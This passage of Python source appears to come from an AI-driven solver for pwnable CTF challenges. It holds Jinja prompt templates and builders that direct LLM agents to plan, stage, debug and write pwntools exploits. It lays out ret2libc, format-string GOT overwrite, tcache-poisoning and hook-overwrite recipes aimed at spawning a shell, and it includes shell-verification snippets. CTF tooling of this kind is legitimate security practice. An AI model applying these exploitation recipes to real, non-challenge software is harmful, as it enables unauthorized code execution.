4. **Forgetting newline**: Many programs use `gets/fgets` which include newline
5. **PIE without leak**: Cannot use hardcoded addresses - must leak first
6. **Canary without leak**: Stack smashing detected - must leak or bypass

## Exploit Code Guidelines
- Use pwntools (`from pwn import *`)
- **MANDATORY: `context.log_level = 'debug'`** — must be at the top of every exploit (right after imports) for I/O tracing
- **CRITICAL: Use ABSOLUTE paths for binary** - `context.binary = '{{ binary_path }}'`
- Include logging (`log.info`, `log.success`)
- Add comments explaining each step
{% if docker_port %}
- **Docker mode is ACTIVE (port {{ docker_port }}).** ALWAYS use `remote()`:
  ```python
  import os
  host = os.environ.get('TARGET_HOST', 'localhost')
  port = int(os.environ.get('TARGET_PORT', {{ docker_port }}))
  p = remote(host, port)
  ```
  **NEVER use `p = process(...)` in Docker mode.**
{% else %}
- **DEFAULT: Use process() for local testing** - pwninit has patched the binary!
- Connection pattern:
  ```python
  import os
  if os.environ.get('TARGET_HOST'):
      host = os.environ.get('TARGET_HOST', 'localhost')
      port = int(os.environ.get('TARGET_PORT', 1337))
      p = remote(host, port)
  else:
      p = process(context.binary.path)
  ```
{% endif %}

{{ tool_descriptions }}
""")


# =============================================================================
# INITIAL PROMPT (Session Start)
# =============================================================================

INITIAL_TEMPLATE = env.from_string("""## Challenge Information

**Title:** {{ challenge.title | default("Unknown") }}
**Category:** {{ challenge.category | default("pwnable") }}
**Flag Format:** {{ challenge.flag_format | default("FLAG{...}") }}

{% if challenge.description %}
**Description:**
{{ challenge.description }}
{% endif %}

## Working Directory
```
{{ directory_listing | default("(not scanned yet)") }}
```

## Target Binary
**Path:** `{{ binary_path | default("(not identified)") }}`
""")


# =============================================================================
# USER PROMPTS (Dynamic)
# =============================================================================

PLAN_USER = env.from_string("""## Current Analysis Document

{{ analysis_document }}

---

{% if crash_analysis and crash_analysis.performed %}
## ⚠️ EXPLOIT FAILURE ANALYSIS (CRITICAL - READ THIS FIRST!)

The previous exploit attempt **FAILED**. Here is the crash analysis:

### Crash Reason
{{ crash_analysis.crash_reason | default("Unknown") }}

### Detected Issues
{% for issue in crash_analysis.exploit_issues %}
- {{ issue }}
{% endfor %}

### Recommendations to Fix
{% for rec in crash_analysis.recommendations %}
- {{ rec }}
{% endfor %}

### Register State at Crash
{% if crash_analysis.registers %}
{% for reg, val in crash_analysis.registers.items() %}
- {{ reg }}: {{ val }}
{% endfor %}
{% endif %}

### Previous Exploit Attempts: {{ exploit_attempts | default(0) }}

**YOUR PRIORITY**: Fix the exploit based on the crash analysis above!
- If offset is wrong → recalculate or verify with cyclic pattern
- If address is invalid → check PIE/ASLR, verify leak is correct
- If alignment issue → add 'ret' gadget before call

---
{% endif %}

## Feedback from Previous Iteration
{% if feedback %}
{{ feedback }}
{% else %}
(First iteration - no feedback yet)
{% endif %}

---

{% if blockers %}
## Active Blockers (Unresolved Questions)
{% for b in blockers %}
{% if not b.resolved %}
- ❓ **[UNRESOLVED]** {{ b.question }} *(severity: {{ b.severity | default(0.5) }})*
{% endif %}
{% endfor %}

**Priority: Resolve the above blockers before moving forward.**

---
{% endif %}

{% if hypotheses %}
## Active Hypotheses (To Verify)
{% for h in hypotheses %}
- 🔬 {{ h.statement }} *(confidence: {{ h.confidence | default(0.5) }})*
{% endfor %}

---
{% endif %}

## Pending Tasks
{% if tasks %}
| ID | Title | Priority | Status |
|----|-------|----------|--------|
{% for t in tasks %}
| {{ t.id }} | {{ t.title }} | {{ t.priority }} | {{ t.status }} |
{% endfor %}
{% else %}
(No tasks yet - create initial tasks)
{% endif %}

---

{% if crash_analysis and crash_analysis.performed %}
Based on the **CRASH ANALYSIS** above, create tasks to fix the exploit.
Focus on: {{ crash_analysis.recommendations[0] | default("verifying offset and addresses") }}
{% else %}
Based on the Analysis Document above, identify [NOT YET] sections and create tasks to fill them.
{% endif %}
Output your response in JSON format.
""")


INSTRUCTION_USER = env.from_string("""## Pending Tasks

{% if tasks %}
{% for t in tasks if t.status == "pending" %}
### {{ t.id }}: {{ t.title }}
- **Priority:** {{ t.priority }}
- **Objective:** {{ t.objective }}
- **Tool Hint:** {{ t.tool_hint | default("None") }}

{% endfor %}
{% else %}
(No pending tasks)
{% endif %}

---

## Execution History (Recent)
{% if runs %}
{% for r in runs[-5:] %}
- [{{ "OK" if r.success else "FAIL" }}] {{ r.task_id }}: {{ (r.commands[0] if r.commands else "(no command)") }}
{% endfor %}
{% else %}
(No previous executions)
{% endif %}

---

## Current Analysis Summary
{% if analysis_summary %}
{{ analysis_summary }}
{% else %}
(No analysis yet)
{% endif %}

---

Select tasks to execute and specify the tool calls.
Output your response in JSON format.
""")


PARSING_USER = env.from_string("""## Execution Results

{% for exec in executions %}
### Task: {{ exec.task_id }}
**Tool:** `{{ exec.tool }}`
**Args:** `{{ exec.args | tojson }}`

**Output:**
```
{{ exec.stdout | default("(no output)") }}
```

{% if exec.stderr %}
**Errors:**
```
{{ exec.stderr }}
```
{% endif %}

---
{% endfor %}

## Current Analysis Document (for reference)
{{ analysis_document }}

---

Parse the execution results and extract structured information.
Output your response in JSON format.
""")


FEEDBACK_USER = env.from_string("""## Current Analysis Document

{{ analysis_document }}

---

## This Iteration Summary

### Tasks Completed
{% if completed_tasks %}
{% for t in completed_tasks %}
- {{ t.id }}: {{ t.title }} - {{ "SUCCESS" if t.success else "FAILED" }}
{% endfor %}
{% else %}
(None)
{% endif %}

### Key Findings This Iteration
{% if key_findings %}
{% for f in key_findings %}
- {{ f }}
{% endfor %}
{% else %}
(None)
{% endif %}

---

## Iteration Count: {{ iteration_count | default(1) }}

---

Evaluate the current progress and provide feedback.
Output your response in JSON format.
""")


EXPLOIT_USER = env.from_string("""## Final Analysis Document

{{ analysis_document }}

---

## Binary Details
**Path:** `{{ binary_path }}`
**Protections:** {{ protections | tojson }}

---

## Confirmed Exploitation Strategy
{{ strategy | default("(Determine from analysis document)") }}

{% if io_patterns %}
---

## Binary I/O Patterns (USE THESE EXACT STRINGS)
{% for pattern in io_patterns %}
- Prompt: `{{ pattern.prompt }}` | Input: `{{ pattern.input_method }}` {% if pattern.format %}(format: `{{ pattern.format }}`){% endif %}
{% endfor %}

**Use these exact strings in sendlineafter/recvuntil calls. Do NOT guess.**
{% endif %}

{% if decompiled_functions %}
---

## Decompiled Functions (for I/O reference)
{% for func in decompiled_functions %}
### {{ func.name }}
```c
{{ func.code }}
```
{% endfor %}
{% endif %}

{% if exploit_failure_history %}
---

## PREVIOUS FAILED ATTEMPTS (DO NOT REPEAT THESE MISTAKES)

{% for failure in exploit_failure_history %}
### Attempt {{ failure.attempt }}
**Error:**
```
{{ failure.error_summary }}
```
{% if failure.exploit_snippet %}
**Failed Code (snippet):**
```python
{{ failure.exploit_snippet }}
```
{% endif %}
{% endfor %}

**IMPORTANT:** Analyze why previous attempts failed and ensure your exploit avoids the same issues.
{% endif %}

---

Generate a complete pwntools exploit.
Output your response in JSON format.
""")


# =============================================================================
# Analysis Document Builder
# =============================================================================

def build_analysis_document(state: SolverState) -> str:
    """Build the Analysis Document from current state"""

    # Default empty analysis structure
    default_analysis = {
        "checksec": {"done": False, "result": None},
        "decompile": {"done": False, "functions": []},
        "disasm": {"done": False, "result": None},
        "vulnerabilities": [],
        "strategy": None,
        "libc": {
            "detected": False,
            "path": None,
            "version": None,
            "one_gadgets": None,
            "offsets": {}
        },
        "gadgets": [],
        "leak_primitive": False,
        "control_hijack": False,
        "payload_ready": False,
        "readiness_score": 0.0
    }

    # Merge with state's analysis
    analysis = state.get("analysis", {})
    for key, val in default_analysis.items():
        if key not in analysis:
            analysis[key] = val

    # Include function_symbols from facts so Stage Identifier can see all function addresses
    function_symbols = state.get("facts", {}).get("function_symbols", {})

    return ANALYSIS_DOCUMENT_TEMPLATE.render(analysis=analysis, function_symbols=function_symbols)


def build_analysis_summary(state: SolverState) -> str:
    """Build a brief summary for Instruction agent"""
    analysis = state.get("analysis", {})

    lines = []

    # Checksec
    if analysis.get("checksec", {}).get("done"):
        lines.append(f"**Protections:** {analysis['checksec'].get('result', 'Unknown')}")

    # Vulnerabilities
    vulns = analysis.get("vulnerabilities", [])
    if vulns:
        vuln_types = [v.get("type", "unknown") for v in vulns]
        lines.append(f"**Vulnerabilities:** {', '.join(vuln_types)}")

    # Libc
    libc = analysis.get("libc", {})
    if libc.get("detected"):
        lines.append(f"**Libc:** {libc.get('path', 'detected')}")

    return "\n".join(lines) if lines else "(No analysis yet)"


# =============================================================================
# Message Builders
# =============================================================================

def build_messages(
    agent: str,
    state: SolverState,
    include_initial: bool = True,
    tool_names: Optional[List[str]] = None,
    **extra_context
) -> List[Dict[str, str]]:
    """
    Build prompt messages for an agent.

    Args:
        agent: "plan" | "instruction" | "parsing" | "feedback" | "exploit"
        state: Current SolverState
        include_initial: Include initial prompt (first call)
        tool_names: Tools to include in description (None = all)
        **extra_context: Additional context variables

    Returns:
        List of {"role": "...", "content": "..."} messages
    """
    agent_lower = agent.lower()

    # System templates
    system_templates = {
        "plan": PLAN_SYSTEM,
        "instruction": INSTRUCTION_SYSTEM,
        "parsing": PARSING_SYSTEM,
        "feedback": FEEDBACK_SYSTEM,
        "exploit": EXPLOIT_SYSTEM,
    }

    # User templates
    user_templates = {
        "plan": PLAN_USER,
        "instruction": INSTRUCTION_USER,
        "parsing": PARSING_USER,
        "feedback": FEEDBACK_USER,
        "exploit": EXPLOIT_USER,
    }

    if agent_lower not in system_templates:
        raise ValueError(f"Unknown agent: {agent}")

    # Tool descriptions for relevant agents
    tool_agents = ["plan", "instruction", "exploit"]
    tool_desc = render_tool_descriptions(tool_names) if agent_lower in tool_agents else ""

    # Build system prompt with challenge context
    system_context = {
        "tool_descriptions": tool_desc,
        "challenge": state.get("challenge", {}),
        "binary_path": state.get("binary_path", ""),
        "docker_port": state.get("docker_port", 0),
        "analysis_failure_reason": state.get("analysis_failure_reason", ""),
        "exploit_failure_context": state.get("exploit_failure_context", {}),
    }
    system_content = system_templates[agent_lower].render(**system_context)

    messages = [{"role": "system", "content": system_content}]

    # Initial prompt (session start)
    if include_initial:
        initial_context = {
            "challenge": state.get("challenge", {}),
            "binary_path": state.get("binary_path", ""),
            "directory_listing": state.get("directory_listing", ""),
        }
        initial_content = INITIAL_TEMPLATE.render(**initial_context)
        messages.append({"role": "user", "content": initial_content})

    # Build user context based on agent
    user_context = _build_user_context(agent_lower, state, extra_context)
    user_content = user_templates[agent_lower].render(**user_context)
    messages.append({"role": "user", "content": user_content})

    return messages


def _build_user_context(agent: str, state: SolverState, extra: Dict) -> Dict[str, Any]:
    """Build context dict for user prompt based on agent type"""

    analysis_doc = build_analysis_document(state)

    if agent == "plan":
        return {
            "analysis_document": analysis_doc,
            "feedback": state.get("feedback_output", {}).get("text", ""),
            "tasks": state.get("tasks", []),
            "crash_analysis": state.get("crash_analysis", {}),
            "exploit_attempts": state.get("exploit_attempts", 0),
            "blockers": state.get("blockers", []),
            "hypotheses": state.get("hypotheses", []),
            "analysis_failure_reason": state.get("analysis_failure_reason", ""),
            "exploit_failure_context": state.get("exploit_failure_context", {}),
            **extra
        }

    elif agent == "instruction":
        return {
            "tasks": state.get("tasks", []),
            "runs": state.get("runs", []),
            "analysis_summary": build_analysis_summary(state),
            **extra
        }

    elif agent == "parsing":
        return {
            "executions": extra.get("executions", []),
            "analysis_document": analysis_doc,
            **extra
        }

    elif agent == "feedback":
        return {
            "analysis_document": analysis_doc,
            "completed_tasks": extra.get("completed_tasks", []),
            "key_findings": extra.get("key_findings", []),
            "iteration_count": state.get("iteration_count", 1),
            **extra
        }

    elif agent == "exploit":
        analysis = state.get("analysis", {})
        return {
            "analysis_document": analysis_doc,
            "binary_path": state.get("binary_path", ""),
            "protections": state.get("protections", {}),
            "strategy": analysis.get("strategy", ""),
            "exploit_failure_history": state.get("exploit_failure_history", []),
            "io_patterns": analysis.get("io_patterns", []),
            "decompiled_functions": analysis.get("decompile", {}).get("functions", []),
            **extra
        }

    return extra


def build_system_prompt(
    agent: str,
    state: Optional[SolverState] = None,
    tool_names: Optional[List[str]] = None
) -> str:
    """Build only the system prompt (includes challenge context if state provided)"""
    system_templates = {
        "plan": PLAN_SYSTEM,
        "instruction": INSTRUCTION_SYSTEM,
        "parsing": PARSING_SYSTEM,
        "feedback": FEEDBACK_SYSTEM,
        "exploit": EXPLOIT_SYSTEM,
    }

    tool_agents = ["plan", "instruction", "exploit"]
    tool_desc = render_tool_descriptions(tool_names) if agent.lower() in tool_agents else ""

    # Build context with challenge info
    context = {"tool_descriptions": tool_desc}
    if state:
        context["challenge"] = state.get("challenge", {})
        context["binary_path"] = state.get("binary_path", "")
        context["docker_port"] = state.get("docker_port", 0)

    return system_templates[agent.lower()].render(**context)


def build_user_prompt(agent: str, state: SolverState, **extra_context) -> str:
    """Build only the user prompt"""
    user_templates = {
        "plan": PLAN_USER,
        "instruction": INSTRUCTION_USER,
        "parsing": PARSING_USER,
        "feedback": FEEDBACK_USER,
        "exploit": EXPLOIT_USER,
    }

    user_context = _build_user_context(agent.lower(), state, extra_context)
    return user_templates[agent.lower()].render(**user_context)


# =============================================================================
# Staged Exploit Templates (단계별 익스플로잇)
# =============================================================================

STAGE_IDENTIFY_SYSTEM = env.from_string("""You are the **Stage Identifier** for a pwnable CTF solver.

Based on the analysis document, determine what STAGES the exploit needs.
Each stage is independently verified before moving to the next.

## Common Stage Patterns

### ret2libc (NX, no canary, no PIE):
1. **leak**: Overflow → leak libc via GOT (puts/write) → return to main. Verify: valid libc address.
2. **trigger**: Overflow → system("/bin/sh") or one_gadget. Verify: shell.

### ret2libc with canary:
1. **canary_leak**: Leak canary value (e.g., format string %p, bruteforce, etc.)
2. **leak**: Overflow (with canary) → leak libc → return to main.
3. **trigger**: Overflow (with canary + libc) → system/one_gadget.

### Format string → GOT overwrite:
1. **leak**: Use %p to leak libc address from stack. Verify: valid libc address.
2. **write**: Overwrite GOT entry with system/one_gadget via %n. Verify: print confirmation.
3. **trigger**: Trigger overwritten function. Verify: shell.

### Heap (tcache poison / UAF) — ARRAY pointer (multiple chunk pointers):
1. **leak**: Allocate large chunk (>0x410) → free → read fd → get libc base from unsorted bin. Verify: valid libc address.
2. **write**: Tcache poison → overwrite __free_hook/__malloc_hook with one_gadget. Verify: confirmation.
3. **trigger**: Trigger overwritten hook (call free/malloc). Verify: shell.

### Heap (tcache poison / UAF) — SINGLE pointer (one chunk variable):
**CRITICAL: Unsorted bin leak DOES NOT WORK with single pointer!**
- Single pointer means only ONE chunk can be tracked at a time.
- Cannot keep a guard chunk alive → freed chunk gets consolidated with top → NO unsorted bin fd leak.
- **MUST use stdout BSS partial overwrite technique:**
  1. **leak**: Tcache poison → partial overwrite fd to point near stdout → overwrite _IO_2_1_stdout_ flags/write_base → leak libc address from stdout output. Verify: valid libc address.
  2. **write**: Tcache poison → overwrite __free_hook/__malloc_hook with one_gadget. Verify: confirmation.
  3. **trigger**: Trigger overwritten hook. Verify: shell.

### Simple ret2win (no PIE, no canary):
1. **trigger**: Overflow → jump to win/flag function at fixed address. Verify: flag or shell.

### ret2win with PIE (no canary):
1. **pie_leak**: Overflow → leak return address from stack → calculate pie_base. Verify: valid binary address.
2. **trigger**: Overflow → jump to pie_base + win_offset. Verify: flag or shell.

### ret2win with canary + PIE:
1. **canary_pie_leak**: Fill buffer to canary → read canary. Continue filling → read return address to get pie_base. Verify: both canary and pie_base non-zero.
2. **trigger**: Overflow with [padding + canary + saved_rbp + (pie_base + win_offset)]. Verify: flag or shell.

**CRITICAL: If analysis.win_function == true, you MUST use ret2win patterns above — NOT ret2libc.**
The hints provided above will tell you exactly which pattern to use based on protections.

## CRITICAL: Heap Pointer Type Detection
- Check the analysis document's "Heap Pointer Structure" section.
- `void *chunk` (single variable) → use stdout BSS partial overwrite for leak
- `void *chunks[N]` (array) → unsorted bin leak OK
- If analysis says "single" pointer, you MUST NOT choose unsorted bin leak.

## Output Format (STRICT JSON)
```json
{
  "reasoning": "Why these stages are needed",
  "stages": [
    {
      "stage_id": "leak",
      "description": "Leak libc base via puts@GOT overflow, return to main for stage 2",
      "verification_marker": "STAGE1_OK",
      "verification_description": "Script prints STAGE1_OK followed by hex libc base address"
    },
    {
      "stage_id": "trigger",
      "description": "Use libc base to call one_gadget or system('/bin/sh')",
      "verification_marker": "SHELL_VERIFIED",
      "verification_description": "Script sends 'id' after shell trigger, checks for uid="
    }
  ]
}
```

## Rules
- MINIMUM 1 stage, MAXIMUM 4 stages
- Final stage `verification_marker` is always `"SHELL_VERIFIED"`
- Simple exploits (ret2win) should be 1 stage only
- Each intermediate stage must end with printing its marker then `p.close()`
- Stage ordering: leak → [canary] → [write] → trigger
""")


STAGE_IDENTIFY_USER = env.from_string("""## Analysis Document

{{ analysis_document }}

## Binary: `{{ binary_path }}`

Based on this analysis, identify the exploitation stages needed.
""")


STAGE_EXPLOIT_SYSTEM = env.from_string("""You are the **Stage Exploit Agent** for a pwnable CTF solver.

You generate exploit code for **ONE SPECIFIC STAGE**. The code must be a **COMPLETE
runnable Python script** that includes all previous verified stages plus the new stage.

{% if challenge %}
## Challenge
- **Title:** {{ challenge.title | default("Unknown") }}
- **Flag Format:** {{ challenge.flag_format | default("FLAG{...}") }}
{% if binary_path %}
- **Binary:** `{{ binary_path }}`
{% endif %}
{% endif %}

## Current Stage: {{ current_stage.stage_id }} ({{ current_stage.stage_index + 1 }} of {{ total_stages }})
- **Description:** {{ current_stage.description }}
- **Verification Marker:** `{{ current_stage.verification_marker }}`

{% if verified_stages %}
## Previously Verified Code (INCLUDE THIS IN YOUR SCRIPT)
The following stages have been tested and work correctly.
Your script MUST include equivalent logic before adding Stage {{ current_stage.stage_index + 1 }}.

{% for vs in verified_stages %}
### Stage {{ loop.index }}: {{ vs.stage_id }} (VERIFIED ✓)
```python
{{ vs.code }}
```
**Output was:**
```
{{ vs.output[:500] }}
```
{% endfor %}
{% endif %}

## CRITICAL Rules

1. **COMPLETE script**: `from pwn import *` through `p.close()`. No missing imports.
2. **Include ALL previous stages**: ASLR means addresses change each run → must re-do leak every time.
3. **context.log_level = 'debug'**: MANDATORY — must appear right after `from pwn import *` at the top of every exploit script. Enables I/O tracing for debugging.
4. **EXACT I/O strings**: Use strings from the decompiled code, never guess.
5. **Prefer one_gadget** over system for hook overwrites (simpler).
6. **NEVER use p.interactive()**: Hangs the subprocess.

## Connection Pattern (MANDATORY)
{% if docker_port %}
**Docker mode is ACTIVE (port {{ docker_port }}).** The binary may not run locally (e.g., missing flag files, special directories).
**ALWAYS use `remote()` for connection:**
```python
import os
host = os.environ.get('TARGET_HOST', 'localhost')
port = int(os.environ.get('TARGET_PORT', {{ docker_port }}))
p = remote(host, port)
```
**NEVER use `p = process(...)` in Docker mode.**
{% else %}
Use `process()` for local testing:
```python
p = process(context.binary.path)
```
{% endif %}

## I/O Interaction Rules (MANDATORY)

**ALWAYS define helper functions** for menu-based programs. Each `scanf()` call in the binary
requires its own `sendline()`, and each `read()` call requires its own `send()`. **NEVER combine
multiple inputs into one `p.send()` call.**

For a typical menu-based binary with Allocate/Free/Print/Edit:
```python
def alloc(size, content):
    p.sendlineafter(b"<last_menu_line>", b"<menu_number>")  # scanf("%d") for menu
    p.sendlineafter(b"<size_prompt>", str(size).encode())     # scanf("%d") for size
    p.sendafter(b"<content_prompt>", content.ljust(size - 1, b"\\x00")[:size - 1])  # read()

def free():
    p.sendlineafter(b"<last_menu_line>", b"<menu_number>")

def print_content():
    p.sendlineafter(b"<last_menu_line>", b"<menu_number>")
    p.recvuntil(b"<output_prefix>")
    return p.recvuntil(b"<next_menu_start>", drop=True)

def edit(content, size):
    p.sendlineafter(b"<last_menu_line>", b"<menu_number>")
    p.sendafter(b"<edit_prompt>", content.ljust(size - 1, b"\\x00")[:size - 1])
```

Replace `<placeholders>` with EXACT strings from the decompiled code (e.g., `b"4. Edit\\n"`, `b"Size: "`, `b"Content: "`).

**Common mistakes to AVOID:**
- `p.send(b"1 " + str(size).encode() + b" " + content)` — WRONG. Each input needs separate send.
- `p.sendline(content)` for `read()` — WRONG. `read()` does not need newline, use `p.send()`.
- Forgetting to receive the prompt before sending — causes desynchronization.
7. **End with verification:**
{% if current_stage.verification_marker == "SHELL_VERIFIED" %}
   After triggering shell:
   ```python
   import time
   time.sleep(0.5)
   p.sendline(b'id')
   time.sleep(0.5)
   response = p.recvrepeat(timeout=2)
   if b'uid=' in response:
       print('SHELL_VERIFIED')
       print(response.decode(errors='ignore'))
   else:
       print('SHELL_FAILED')
       print(response.decode(errors='ignore'))
   p.close()
   ```
{% else %}
   After completing this stage's work, **VALIDATE the result before printing the marker**:
   ```python
   # Example for leak stage:
   leaked_value = ...  # the value you leaked
   # VALIDATE: check it's a real libc/heap address, not garbage
   if leaked_value > 0x7f0000000000 and leaked_value < 0x7fffffffffff:
       libc_base = leaked_value - offset
       print(f"{{ current_stage.verification_marker }} leaked=0x{leaked_value:x} libc_base=0x{libc_base:x}")
   else:
       print(f"STAGE_FAILED leaked=0x{leaked_value:x} (invalid address)")
   p.close()
   ```
   **CRITICAL**: NEVER print the marker unconditionally. Always validate:
   - Leak stage: Check address is in valid range (libc: 0x7f..., heap: > 0x500000)
   - Write stage: Verify write was successful (e.g., read back value or check return)
   - If validation fails, print `STAGE_FAILED` instead of the marker.
   Do NOT proceed to next stage logic. Stop after printing the marker.
{% endif %}
8. **Heap pointer type awareness**: Check the analysis document for `heap_pointer_type`.
   - If `single`: Do NOT use unsorted bin leak. Use stdout BSS partial overwrite instead.
   - If `array`: Unsorted bin leak is OK.

## Output Format (STRICT JSON)
```json
{
  "reasoning": "How this stage works",
  "exploit_code": "from pwn import *\\ncontext.log_level = 'debug'\\n...",
  "key_steps": ["1. ...", "2. ..."]
}
```
**exploit_code MUST start with:** `from pwn import *` and `context.log_level = 'debug'` (mandatory for debug output).
""")


STAGE_EXPLOIT_USER = env.from_string("""## Analysis Document

{{ analysis_document }}

{% if io_patterns %}
## I/O Patterns (from decompiled code)
{% for pattern in io_patterns %}
- {{ pattern }}
{% endfor %}
{% endif %}

{% if decompiled_functions %}
## Key Decompiled Functions
{% for func in decompiled_functions %}
### {{ func.name }} ({{ func.address }})
```c
{{ func.code }}
```
{% endfor %}
{% endif %}

{% if io_helper_code %}
## I/O Helper Functions (USE THESE EXACTLY)
The following helper functions are generated from the decompiled binary.
**You MUST use these helper functions in your exploit code. Do NOT write your own I/O logic.**

```python
{{ io_helper_code }}
```
{% endif %}

Generate the exploit code for **Stage {{ current_stage.stage_index + 1 }}: {{ current_stage.stage_id }}**.
Description: {{ current_stage.description }}
Expected marker: `{{ current_stage.verification_marker }}`
""")


STAGE_REFINE_SYSTEM = env.from_string("""You are an expert at debugging pwntools exploits.

A staged exploit script failed at **Stage {{ stage.stage_id }}** (stage {{ stage.stage_index + 1 }}).
{% if stage.stage_index > 0 %}
Previous stages (1~{{ stage.stage_index }}) were verified working. Do NOT modify their logic.
Only fix the Stage {{ stage.stage_index + 1 }} portion of the code.
{% endif %}

The expected verification marker is: `{{ stage.verification_marker }}`

## Output Format (STRICT JSON)
```json
{
  "reasoning": "What went wrong and how to fix it",
  "exploit_code": "from pwn import *\\ncontext.log_level = 'debug'\\n...(complete fixed script)",
  "changes_made": ["List of changes"]
}
```
**exploit_code MUST include** `context.log_level = 'debug'` immediately after imports.

CRITICAL: NEVER use p.interactive(). After triggering shell, verify with:
```python
import time
time.sleep(0.5)
p.sendline(b'id')
time.sleep(0.5)
response = p.recvrepeat(timeout=2)
if b'uid=' in response:
    print('SHELL_VERIFIED')
    print(response.decode(errors='ignore'))
else:
    print('SHELL_FAILED')
    print(response.decode(errors='ignore'))
p.close()
```

{% if docker_port %}
**Docker mode is ACTIVE.** The script MUST use `remote()`, not `process()`:
```python
import os
host = os.environ.get('TARGET_HOST', 'localhost')
port = int(os.environ.get('TARGET_PORT', {{ docker_port }}))
p = remote(host, port)
```
If the failing script uses `process()`, change it to `remote()`.
{% endif %}

Focus on:
- **MUST keep `context.log_level = 'debug'`** in the fixed script (at top, after imports)
- Incorrect I/O string matching (wrong menu strings)
- Stack alignment issues (ret gadget)
- Wrong offsets or addresses
- Null byte handling
- Timing issues (add sleep if needed)

**I/O RULES (most common failure cause):**
- Each `scanf()` call needs its own `p.sendlineafter(prompt, value)`
- Each `read()` call needs its own `p.sendafter(prompt, data)`
- NEVER combine multiple inputs into one `p.send()` call
- NEVER use `p.send(b"1 " + ...)` to combine menu + size + content

**DO NOT change the exploitation technique/strategy.**
- If the stage description says "stdout BSS partial overwrite", keep that approach
- If it says "unsorted bin leak", keep that approach
- Only fix HOW the technique is implemented (I/O, offsets, sizes), not WHAT technique is used
- Changing from stdout BSS to GOT leak is a STRATEGY CHANGE — FORBIDDEN in refinement
""")


STAGE_REFINE_USER = env.from_string("""## Failing Stage: {{ stage.stage_id }} (Stage {{ stage.stage_index + 1 }})
- Expected marker: `{{ stage.verification_marker }}`
- Refinement attempt: {{ stage.refinement_attempts + 1 }}

## Current Script (FAILED)
```python
{{ stage.code }}
```

## Error Output
```
{{ error_output[:2000] }}
```

## Analysis Document
{{ analysis_document }}

{% if io_helper_code %}
## Correct I/O Helper Functions (USE THESE)
```python
{{ io_helper_code }}
```
{% endif %}

Fix ONLY the Stage {{ stage.stage_index + 1 }} logic. Previous stages are verified working.
""")


def _generate_io_helper_code(state: SolverState) -> str:
    """
    Generate I/O helper function code from decompiled source.

    Analyzes the decompiled code for menu-based patterns (scanf + read/gets)
    and generates correct sendlineafter/sendafter helper functions.
    """
    import re

    analysis = state.get("analysis", {})
    functions = analysis.get("decompile", {}).get("functions", [])
    io_patterns = analysis.get("io_patterns", [])

    if not functions:
        return ""

    # Combine all decompiled code
    all_code = "\n".join(f.get("code", "") for f in functions)

    # Detect menu pattern: look for printf strings followed by scanf
    # Common patterns: "1. Allocate", "2. Free", "3. Print", "4. Edit"
    menu_lines = re.findall(r'(?:printf|puts)\s*\(\s*"([^"]*\\n)"', all_code)
    if not menu_lines:
        menu_lines = re.findall(r'"(\d+\.\s+\w+(?:\\n)?)"', all_code)

    # Find the last menu line to use as the sync point
    last_menu_line = ""
    for line in menu_lines:
        line = line.replace("\\n", "\n")
        if line.strip():
            last_menu_line = line

    if not last_menu_line:
        # Fallback: try to find from io_patterns
        for p in io_patterns:
            prompt = p.get("prompt", "")
            if any(kw in prompt.lower() for kw in ("edit", "quit", "exit", "delete")):
                last_menu_line = prompt
                break

    # Detect specific prompts from io_patterns or decompiled code
    size_prompt = ""
    content_prompt = ""
    edit_prompt = ""

    for p in io_patterns:
        prompt = p.get("prompt", "")
        if "size" in prompt.lower():
            size_prompt = prompt
        elif "content" in prompt.lower():
            content_prompt = prompt
        elif "edit" in prompt.lower():
            edit_prompt = prompt

    # Fallback: extract from decompiled code
    if not size_prompt:
        m = re.search(r'printf\s*\(\s*"(Size[^"]*)"', all_code)
        if m:
            size_prompt = m.group(1).replace("\\n", "\n")
    if not content_prompt:
        m = re.search(r'printf\s*\(\s*"(Content[^"]*)"', all_code)
        if m:
            content_prompt = m.group(1).replace("\\n", "\n")
    if not edit_prompt:
        m = re.search(r'printf\s*\(\s*"(Edit[^"]*)"', all_code)
        if m:
            edit_prompt = m.group(1).replace("\\n", "\n")

    if not last_menu_line:
        return ""  # Can't generate helpers without menu pattern

    # Escape for Python bytes
    def py_bytes(s: str) -> str:
        return s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")

    menu_b = py_bytes(last_menu_line)
    helpers = []

    # Detect if alloc uses read() (fixed size) or scanf/gets (line-based)
    uses_read = "read(" in all_code and ("size" in all_code.lower() or "len" in all_code.lower())

    # alloc helper
    if size_prompt and content_prompt:
        if uses_read:
            helpers.append(f'''def alloc(size, content):
    p.sendlineafter(b"{menu_b}", b"1")
    p.sendlineafter(b"{py_bytes(size_prompt)}", str(size).encode())
    p.sendafter(b"{py_bytes(content_prompt)}", content.ljust(size - 1, b"\\x00")[:size - 1])''')
        else:
            helpers.append(f'''def alloc(size, content):
    p.sendlineafter(b"{menu_b}", b"1")
    p.sendlineafter(b"{py_bytes(size_prompt)}", str(size).encode())
    p.sendlineafter(b"{py_bytes(content_prompt)}", content)''')

    # free helper
    helpers.append(f'''def free():
    p.sendlineafter(b"{menu_b}", b"2")''')

    # print helper
    if content_prompt:
        helpers.append(f'''def print_content():
    p.sendlineafter(b"{menu_b}", b"3")
    p.recvuntil(b"{py_bytes(content_prompt)}")
    return p.recvuntil(b"1.", drop=True)''')

    # edit helper
    if edit_prompt:
        if uses_read:
            helpers.append(f'''def edit(content, size):
    p.sendlineafter(b"{menu_b}", b"4")
    p.sendafter(b"{py_bytes(edit_prompt)}", content.ljust(size - 1, b"\\x00")[:size - 1])''')
        else:
            helpers.append(f'''def edit(content):
    p.sendlineafter(b"{menu_b}", b"4")
    p.sendlineafter(b"{py_bytes(edit_prompt)}", content)''')

    return "\n\n".join(helpers) if helpers else ""


def build_stage_exploit_messages(
    state: SolverState,
    current_stage: Dict[str, Any],
    verified_stages: List[Dict[str, Any]],
) -> List[Dict[str, str]]:
    """Build prompt messages for stage exploit generation."""
    analysis = state.get("analysis", {})
    staged = state.get("staged_exploit", {})

    system_content = STAGE_EXPLOIT_SYSTEM.render(
        current_stage=current_stage,
        total_stages=len(staged.get("stages", [])),
        verified_stages=verified_stages,
        challenge=state.get("challenge", {}),
        binary_path=state.get("binary_path", ""),
        docker_port=state.get("docker_port", 0),
    )

    # Generate I/O helper code from decompiled binary
    io_helper_code = _generate_io_helper_code(state)

    user_content = STAGE_EXPLOIT_USER.render(
        analysis_document=build_analysis_document(state),
        binary_path=state.get("binary_path", ""),
        io_patterns=analysis.get("io_patterns", []),
        decompiled_functions=analysis.get("decompile", {}).get("functions", []),
        current_stage=current_stage,
